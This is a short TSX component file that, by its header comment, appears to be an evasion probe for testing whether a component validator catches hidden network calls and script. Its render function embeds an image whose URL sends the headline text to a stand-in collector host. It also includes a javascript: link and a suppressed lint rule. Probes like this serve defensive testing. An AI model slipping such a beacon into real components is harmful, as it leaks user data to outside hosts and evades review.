// Evasion probe (D2 spike): network and script through plain markup; no banned name at all.
import { z } from "zod";
import type { Kit } from "@/puck/agent-kit";

export const schema = z.object({
  id: z.string(),
  surface: z.enum(["page", "card", "muted", "brandSubtle", "brand", "inverse"]),
  headline: z.string(),
}).strict();

export function render(props: z.infer<typeof schema>, kit: Kit) {
  return (
    <kit.Shell surface={props.surface}>
      <h2 className="font-headline text-headline">{props.headline}</h2>
      {/* eslint-disable-next-line @next/next/no-img-element */}
      <img src={`https://collector.example/p.gif?text=${encodeURIComponent(props.headline)}`} alt="" />
      <a href="javascript:void(0)" className="font-body text-body">Read more</a>
    </kit.Shell>
  );
}
